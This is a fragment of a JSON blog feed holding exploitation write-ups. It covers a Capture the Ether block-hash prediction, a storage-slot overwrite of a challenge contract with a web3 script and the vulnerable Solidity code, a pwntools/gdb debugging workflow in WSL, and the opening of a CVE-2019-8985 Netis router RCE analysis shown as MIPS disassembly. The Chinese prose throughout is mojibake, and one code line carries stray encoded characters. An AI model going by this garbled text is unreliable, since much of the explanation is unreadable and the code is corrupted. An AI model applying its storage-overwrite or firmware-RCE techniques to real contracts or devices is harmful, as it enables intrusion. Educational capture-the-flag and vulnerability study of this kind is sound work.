class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬éœ€è¦æå‰é¢„æµ‹ block + 1 çš„ hash<br>\n ä½†æ˜¯éš¾ç‚¹æ˜¯æˆ‘ä»¬è°ƒç”¨åº“ hash æ˜¯æ²¡æ³• hash å‡ºä¸‹ä¸€å— block çš„ hash çš„</p>\n<blockquote>\n<p>The block hashes are not available for all blocks for scalability reasons.<br>\nYou can only access the hashes of the most recent 256 blocks, all other values will be zero.</p>\n</blockquote>\n<p>ä½†æ˜¯ç”±äºè¿™ä¸ªæ¸…é›¶ç‰¹æ€§å’Œå—æ•°å’Œ hash æ˜¯å¼‚æ­¥åˆ†æ—¶çš„<br>\nåªéœ€è¦ç­‰ 256 ä¸ªå—æŒ–å®Œäº†ï¼ˆ15s ä¸€ä¸ªï¼‰ä¹‹å‰çŒœä¸ª 0 å³å¯</p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "url": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "title": "BlockChain-from-scratch-mapping",
            "date_published": "2022-08-27T08:51:10.000Z",
            "content_html": "<p><a href=\"https://capturetheether.com/challenges/math/mapping/\">Capture the Ether - Mapping</a><br>\n ä»ä¸€é“é¢˜å…¥é—¨ blockchain</p>\n<h2 id=\"evmå­˜å‚¨ç®€ä»‹\"><a class=\"markdownIt-Anchor\" href=\"#evmå­˜å‚¨ç®€ä»‹\">#</a> EVM å­˜å‚¨ç®€ä»‹</h2>\n<p>solidity ç¼–è¯‘åçš„æ•°æ®<br>\næ˜¯æ”¾åœ¨ slot çš„ç»“æ„ä¸­<br>\n slot æœ‰ 2 ^ 256 ä¸ª<br>\næ¯ä¸€ä¸ªæœ‰ 256 ä½</p>\n<p>å¯¹äº solidity ä¸­çš„å¯ä»¥åœ¨ç¼–è¯‘æœŸé—´ç¡®å®šçš„é™æ€å…ƒç´ <br>\n solc ä¼šå°†å…¶ä¾æ¬¡æ”¾å…¥å†…å­˜æ’æ§½ä¸­ï¼ˆslotï¼‰<br>\n<img src=\"/2022/08/27/BlockChain-from-scratch-mapping/1.png\" alt><br>\nè¿™é‡Œ bcd éƒ½æ˜¯ 256 ä½<br>\næ‰€ä»¥æ”¾åœ¨ slot [0â€¦2]<br>\n ä½†å¦‚æœæ˜¯å¯å˜é•¿æ•°æ®ç»“æ„å¦‚æœæ˜¯ array æˆ–è€… map<br>\n å€¼ä¼šè¢«æ”¾åœ¨å…¶ä»–åœ°æ–¹ ä¸ºäº†æ€§èƒ½ è¿™é‡Œæ˜¯ç›´æ¥å¯¹å½“å‰çš„ idx å– keccak<br>\n æ¯”å¦‚ <code>keccak(0) = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code> <br>\n å¦‚æœ <code>slot[0]</code>  æ˜¯ array çš„è¯ é‚£ä¹ˆæ•°æ®å°±ä¼šè¢«æ”¾åœ¨<br>\n <code>slot[0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563]</code>  é‡Œ</p>\n<p>æ³¨æ„è¿™é‡Œ keccak æ˜¯å¯¹è¡¥é½åçš„å­—ç¬¦ä¸²è¿›è¡Œ hash çš„ è€Œä¸æ˜¯å¯¹æ•°å­—<br>\næ‰€ä»¥éœ€è¦ padding ä¸€ä¸‹</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>solidity åŒæ ·å­˜åœ¨å’Œ c ä¸€æ ·å†…å­˜å¯¹é½çš„æ¦‚å¿µ ä¸å†èµ˜è¿°</p>\n<h2 id=\"cte-mapping\"><a class=\"markdownIt-Anchor\" href=\"#cte-mapping\">#</a> cte-mapping</h2>\n<p>é¦–å…ˆçœ‹åˆçº¦ map çš„ kv å¯æ§</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MappingChallenge &#123;</span><br><span class=\"line\">    <span class=\"type\">bool</span> public isComplete;</span><br><span class=\"line\">    uint256[] <span class=\"built_in\">map</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">set</span><span class=\"params\">(uint256 key, uint256 value)</span> public &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Expand dynamic array as needed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">map</span>.length &lt;= key) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">map</span>.length = key + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">map</span>[key] = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">get</span><span class=\"params\">(uint256 key)</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(uint256)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">map</span>[key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿æ¥åˆ°åˆçº¦</p>\n<p>set æ˜¯å¯ä»¥æ§åˆ¶ä¸‹æ ‡ é‚£ä¹ˆç»™ <code>isComplete</code>  è¦†ç›–æ‰å°±è¡Œäº† ååˆ†æ¸…æ¥š<br>\n map æ˜¯å¯å˜ç»“æ„ æ¯ä¸ªæˆå‘˜æ˜¯å­˜æ”¾åœ¨ <code>keccak(padding(1))</code>  ä¾æ¬¡å¾€ä¸Šçš„åœ°æ–¹<br>\nå¯ä»¥æ‰“å°çœ‹åˆ°</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ethers = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ethers&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs-extra&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&#x27;dotenv&#x27;</span>).<span class=\"title function_\">config</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">Web3</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;web3&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> web3 =  <span class=\"keyword\">new</span> <span class=\"title class_\">Web3</span>(<span class=\"string\">&quot;your_rpc_url&quot;</span>)</span><br><span class=\"line\">contractAddr = <span class=\"string\">&quot;your_account_addr&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">cl</span> = x =&gt; <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(x)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i %3C (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getSlot</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddr, idx)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">utils</span>.<span class=\"title function_\">sha3</span>(<span class=\"title function_\">padding</span>(idx))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>()</span><br><span class=\"line\">\t.<span class=\"title function_\">then</span>(<span class=\"function\">() =&gt;</span> process.<span class=\"title function_\">exit</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err),</span><br><span class=\"line\">\t\tprocess.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;)&gt;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸‰ä¸ªå°±æ˜¯æˆ‘ä»¬ map ç¬¬ä¸€ä¸ªå…ƒç´ å­˜æ”¾çš„ä½ç½®<br>\nç”¨ <code>2**256</code>  å‡ä¸€ä¸‹å°±æ˜¯åç§»äº†</p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/2.png\" alt></p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/3.png\" alt></p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/",
            "url": "https://squirre17.github.io/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/",
            "title": "pwn in WSL Pwsh and Vscode",
            "date_published": "2022-08-16T08:42:50.000Z",
            "content_html": "<h2 id=\"èƒŒæ™¯æè¦\"><a class=\"markdownIt-Anchor\" href=\"#èƒŒæ™¯æè¦\">#</a> èƒŒæ™¯æè¦</h2>\n<p>å›æ ¡åæ¥åˆ°å®éªŒå®¤ å€Ÿç”¨äº†ä¸‹å§šä½¬çš„ 2k å¤§å± å‘ç°ç¡®å®èˆ’æœ ä½†æ˜¯æœ‰ä¸ªè‡´å‘½çš„é—®é¢˜ é”®ç›˜è¾“å…¥å’Œæ˜¾ç¤ºå™¨æ˜¾ç¤ºæœ‰æ˜æ˜¾çš„å»¶è¿Ÿ<br>\nä½†æ˜¯åœ¨ä¸»æœºå°±æ²¡äº‹<br>\nåŠ ä¸Šä¹‹å‰ä¹ŸåŒçƒ¦äº†åœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´åˆ’æ¥åˆ’å» æ€ªéº»çƒ¦çš„<br>\nå°±æƒ³æœ‰æ²¡æœ‰å¯æ›¿ä»£çš„æ–¹æ¡ˆ è®©æˆ‘ä¸éœ€è¦è¿›è™šæ‹Ÿæœºï¼ˆå°†å…¶å½“ä¸ªè¿œç¨‹æœåŠ¡å™¨ï¼‰<br>\nå°±èƒ½èˆ’èˆ’æœæœçš„åš pwn é¢˜</p>\n<p>ç„¶åå‘ç°äº†<a href=\"https://blog.csome.cc/p/2022CISCN-hn-wp/\"> Csome</a> å¸ˆå‚…çš„åšå®¢ æ˜¯ç”¨ powershell åœ¨ wsl è¿›è¡Œçš„<br>\nç„¶åæˆ‘å®¡è®¡äº†ä¸€ä¸‹ pwntools çš„æºç <br>\nç¡®å®ä¼šå¯åŠ¨ä¸€ä¸ª terminal è¿›ç¨‹ å°†æˆ‘ä»¬è¾“å…¥çš„å‚æ•°è¿›å»æ‰§è¡Œ<br>\nåœ¨ window ä¸‹å¯åŠ¨çš„è¿›ç¨‹æ˜¯ <code>cmd.exe</code>  æ˜¯æŒ‚è½½åœ¨ <code>/mnt</code>  ç›®å½•ä¸‹<br>\nä½†æ˜¯ç”±äºæ˜¯è·¨æ–‡ä»¶ç³»ç»Ÿ æ‰“å¼€å®åœ¨å¤ªæ…¢ ï¼ˆwindow çš„ç¨‹åºè¦è®¿é—® linux è¿›ç¨‹å†…éƒ¨çš„å†…å­˜ç©ºé—´ å¾—å…ˆä» Linux åˆ‡è¿› window<br>\n åœ¨ window ä¸Šæ‰“å¼€ <code>cmd.exe</code>  å†åˆ‡å› Linuxï¼‰</p>\n<p>å› æ­¤å¯»æ‰¾åˆ«çš„æ›¿ä»£æ–¹æ¡ˆ<br>\næ­£å¥½ä¹Ÿæ˜¯ defcon æ—¶æœŸ æ— èŠåˆ·æ¨çš„æ—¶å€™çœ‹åˆ°<a href=\"https://www.youtube.com/watch?v=8QAGLdY6bDw\"> DEF CON LiveCTF 2022 - Day 2 - YouTube</a><br>\n ä¸­é—´çš„ winpwn ç©å®¶é‡‡å–çš„æ–¹æ³•<br>\nå…¶å®ä¹Ÿå°±æ˜¯ pause ç­‰å¾…è¿›ç¨‹ attach ç½¢äº† ä¸è¿‡è¿™ä¸ªè¶³ä»¥è§£å†³æˆ‘çš„ä¸€åˆ‡é—®é¢˜</p>\n<h2 id=\"pwnè„šæœ¬ä¸­å®šä¹‰ä¸ªå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#pwnè„šæœ¬ä¸­å®šä¹‰ä¸ªå‡½æ•°\">#</a> pwn è„šæœ¬ä¸­å®šä¹‰ä¸ªå‡½æ•°</h2>\n<p>ä¸¾ä¾‹ è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ª dbg å‡½æ•° å¯ä»¥å°†æˆ‘ä»¬ä¼ å…¥çš„æ–­ç‚¹å’Œ set ä¿¡æ¯ç»Ÿç»Ÿå†™å…¥ <code>/tmp/gdbscript</code>  ä½œä¸º gdb å¯åŠ¨ä¿¡æ¯<br>\nï¼ˆpwntools å†…éƒ¨å°±æ˜¯è¿™ä¹ˆå®ç°çš„ ä¾è‘«èŠ¦ç”»ç“¢<br>\n dft æ˜¯é¢„å®šä¹‰çš„ä¸€äº›ä¿¡æ¯ æ¯”å¦‚ <code>set $a=0xdeedbeaf</code>  è¿™äº›éœ€è¦æ¯æ¬¡éƒ½å†™å…¥çš„å°±å†™åˆ° dft é‡Œé¢å»</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./emulator&quot;</span>, env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>: <span class=\"string\">&quot;./libunicorn.so.1&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">sc      = <span class=\"keyword\">lambda</span> s, addr            :success(s + <span class=\"string\">&quot; =&gt; &quot;</span> + <span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\">ps\t\t= <span class=\"keyword\">lambda</span> \t\t\t\t\t:pause()</span><br><span class=\"line\"></span><br><span class=\"line\">dft = [<span class=\"string\">&quot;b *0x1234&quot;</span>, <span class=\"string\">&quot;b *0x7890000&quot;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>(<span class=\"params\">s=[<span class=\"string\">&quot;&quot;</span>]</span>):</span><br><span class=\"line\">\ta = dft + s</span><br><span class=\"line\">\tf = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;/tmp/gdbscript&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\">\ta = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x:x + <span class=\"string\">&#x27;\\n&#x27;</span>, a))</span><br><span class=\"line\">\tf.writelines(a)</span><br><span class=\"line\">\tf.close()</span><br><span class=\"line\">\tps()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tlibc = ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">\tdbg([<span class=\"string\">&quot;b *0xdeedbeaf&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br><span class=\"line\">\tir()</span><br></pre></td></tr></table></figure>\n<h2 id=\"gdbçš„å¯åŠ¨æ–¹å¼\"><a class=\"markdownIt-Anchor\" href=\"#gdbçš„å¯åŠ¨æ–¹å¼\">#</a> gdb çš„å¯åŠ¨æ–¹å¼</h2>\n<p>æ‰§è¡Œ py è„šæœ¬ pause æŒ‚èµ·å<br>\nç”±æˆ‘ä»¬çš„ powershell å» attach</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb attach $(pidof procname) -x /tmp/gdbscript</span><br></pre></td></tr></table></figure>\n<p>procname æ˜¯ç¨‹åºå</p>\n<p>æˆ–è€…æ›´ç›´æ¥ç‚¹ å†™ä¸ªè„šæœ¬ <code>pgdb</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/sh</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">gdb attach $(pidof procname) -x /tmp/gdbscript</span></span><br><span class=\"line\">if [ $# -ne 1 ];then</span><br><span class=\"line\">\techo &quot;usage : pgdb procname&quot;</span><br><span class=\"line\">\texit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\">pid=`pidof $1`</span><br><span class=\"line\">gdb attach $pid -x /tmp/gdbscript</span><br></pre></td></tr></table></figure>\n<p>åªéœ€è¦ <code>pgdb procname</code>  å°±èƒ½ attach äº†</p>\n<h2 id=\"å·¥ä½œæµ\"><a class=\"markdownIt-Anchor\" href=\"#å·¥ä½œæµ\">#</a> å·¥ä½œæµ</h2>\n<p>vscode å†™ exp<br>\nvscode terminal è¿›è¡Œ exp çš„æ‰§è¡Œï¼ˆæœ€å–œæ¬¢çš„ terminal<br>\npowershell è¿›è¡Œ gdb<br>\n<img src=\"/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/20220816164008.png\" alt=\"Pasted image 20220816164008\"></p>\n",
            "tags": [
                "Tips"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "url": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "title": "CVEâ€“2019â€“8985 Netis WF2411 RCE detail",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"ç¯å¢ƒæ­å»º\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒæ­å»º\">#</a> ç¯å¢ƒæ­å»º</h2>\n<p>å›ºä»¶è·å–  <a href=\"https://www.netis-systems.com/Suppory/de_details/id/1/de/168.html\">WF2419</a><br>\n<a href=\"https://www.tacnetsol.com/blog/cve-2019-8985-rce\">Fetching Title#sw0w</a><br>\n é€‰æ‹© WF2419ï¼ˆ2.2.36123ï¼‰</p>\n<p>å…ˆé€†å‘åˆ†æ <code>boa</code> <br>\n æ¼æ´ç‚¹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">loc_4145D8:              <span class=\"meta\"># s</span></span><br><span class=\"line\">addiu   $a0, $sp, <span class=\"number\">0x60</span>+var_40</span><br><span class=\"line\">li      $a1, <span class=\"number\">0x420000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $a1, (aSS_0 - <span class=\"number\">0x420000</span>)  # <span class=\"string\">&quot;%s:%s&quot;</span></span><br><span class=\"line\">move    $a2, $s0</span><br><span class=\"line\">move    $a3, $s4</span><br><span class=\"line\">la      $t9, <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">jalr    $t9 ; <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">lw      $gp, <span class=\"number\">0x60</span>+var_48($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">li      $s3, <span class=\"number\">0x460000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s3, (byte_4596D0 - <span class=\"number\">0x460000</span>)</span><br><span class=\"line\">lbu     $v0, <span class=\"number\">0x60</span>+var_40($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s2, $v0, <span class=\"number\">-0x3A</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">user_ok</span><span class=\"params\">(<span class=\"type\">const</span> 